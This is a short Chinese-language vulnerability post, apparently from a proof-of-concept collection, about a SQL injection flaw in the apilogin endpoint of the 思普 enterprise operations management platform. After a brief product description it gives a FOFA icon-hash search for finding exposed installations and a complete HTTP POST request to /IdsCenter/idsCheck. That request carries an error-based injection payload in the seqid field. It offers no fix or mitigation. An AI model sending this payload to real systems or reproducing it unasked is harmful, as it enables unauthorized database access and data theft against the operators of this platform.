# 思普企业运营管理平台apilogin存在SQL注入漏洞

思普企业运营管理平台是一款专为企业提供全方位运营管理解决方案的软件平台，旨在帮助企业实现运营流程的可视化、自动化和协同化管理，提升运营效率和管理水平。平台集成了多个功能模块，包括人力资源管理、财务管理、供应链管理、销售管理、项目管理等，通过集成各个部门功能模块，形成企业运营管理的全面解决方案。企业可以根据实际需求选择安装相应的模块，实现企业内部各个环节的协同管理。

## fofa

```javascript
icon_hash="-403479360"
```

## poc

```javascript
POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
X-Requested-With: XMLHttpRequest

seqid=1%27+AND+6884+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286884%3D6884%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--+cxaC&datasource=EOMP1
```

![image-20241128094626617](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280946689.png)